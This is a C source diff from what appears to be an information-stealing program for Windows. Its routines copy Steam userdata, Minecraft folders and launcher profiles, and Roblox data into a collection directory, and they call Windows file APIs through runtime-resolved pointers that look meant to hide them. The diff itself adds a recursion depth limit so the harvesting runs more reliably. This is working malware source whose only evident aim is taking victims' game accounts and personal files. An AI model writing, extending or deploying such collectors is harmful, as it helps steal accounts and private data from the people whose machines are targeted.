@@ -74,7 +74,8 @@ static int ensure_dir(const char *path) {
 }
 
 /* Recursively copy src_dir contents into dst_dir */
-static void copy_dir_recursive(const char *src_dir, const char *dst_dir) {
+static void copy_dir_recursive(const char *src_dir, const char *dst_dir, int depth) {
+    if (depth > 16) return;
     WIN32_FIND_DATAA fd;
     char pattern[MAX_PATH];
     char src[MAX_PATH];
@@ -92,7 +93,7 @@ static void copy_dir_recursive(const char *src_dir, const char *dst_dir) {
                 continue;
             snprintf(src, sizeof(src), "%s\\%s", src_dir, fd.cFileName);
             snprintf(dst, sizeof(dst), "%s\\%s", dst_dir, fd.cFileName);
-            copy_dir_recursive(src, dst);
+            copy_dir_recursive(src, dst, depth + 1);
         } else {
             snprintf(src, sizeof(src), "%s\\%s", src_dir, fd.cFileName);
             snprintf(dst, sizeof(dst), "%s\\%s", dst_dir, fd.cFileName);
@@ -198,7 +199,7 @@ static int collect_userdata_dirs(const char *steam_path, const char *output_dir)
         if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
         snprintf(src, sizeof(src), "%s\\%s", userdata_src, fd.cFileName);
         snprintf(dst, sizeof(dst), "%s\\%s", userdata_dst, fd.cFileName);
-        copy_dir_recursive(src, dst);
+        copy_dir_recursive(src, dst, 0);
     } while (gm_api.pFN(hFind, &fd));
 
     gm_api.pFClose(hFind);
@@ -269,7 +270,7 @@ int gaming_collect_minecraft(const char *output_dir) {
     char vanilla[MAX_PATH];
     snprintf(vanilla, sizeof(vanilla), "%s\\.minecraft", appdata);
     if (dir_exists(vanilla)) {
-        copy_dir_recursive(vanilla, dst_mc);
+        copy_dir_recursive(vanilla, dst_mc, 0);
     }
 
     /* Launcher profiles from vanilla */
@@ -290,7 +291,7 @@ int gaming_collect_minecraft(const char *output_dir) {
 
         char dst_launcher[MAX_PATH];
         snprintf(dst_launcher, sizeof(dst_launcher), "%s\\%s", dst_mc, mc_launchers[i].name);
-        copy_dir_recursive(launcher_path, dst_launcher);
+        copy_dir_recursive(launcher_path, dst_launcher, 0);
     }
 
     return 0;
@@ -309,7 +310,7 @@ int gaming_collect_roblox(const char *output_dir) {
 
     char dst_roblox[MAX_PATH];
     snprintf(dst_roblox, sizeof(dst_roblox), "%s\\roblox", output_dir);
-    copy_dir_recursive(roblox_src, dst_roblox);
+    copy_dir_recursive(roblox_src, dst_roblox, 0);
 
     return 0;
 }
